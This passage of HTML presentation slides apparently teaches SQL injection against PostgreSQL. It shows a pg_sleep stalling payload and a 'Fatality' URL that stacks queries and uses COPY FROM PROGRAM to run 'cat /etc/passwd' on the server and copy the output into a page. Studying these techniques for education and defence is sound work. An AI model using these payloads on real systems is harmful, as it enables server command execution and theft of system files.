            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1'
UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>SQL-injection: Fatality</h2>
    <img class="next" style="position: absolute; bottom: 0px; height: 200px; right: 0px" src="toasty.png"/>
    <ul>
        <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1; --</code><br/>
            <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1';
CREATE TEMP TABLE tmp1 (content text);
COPY tmp1 FROM PROGRAM 'cat /etc/passwd';
UPDATE news SET body = (
    SELECT string_agg(content, E'\n') FROM tmp1
) WHERE id = 1;
--</mark>'</code></pre>
        </li>
    </ul>
</section>
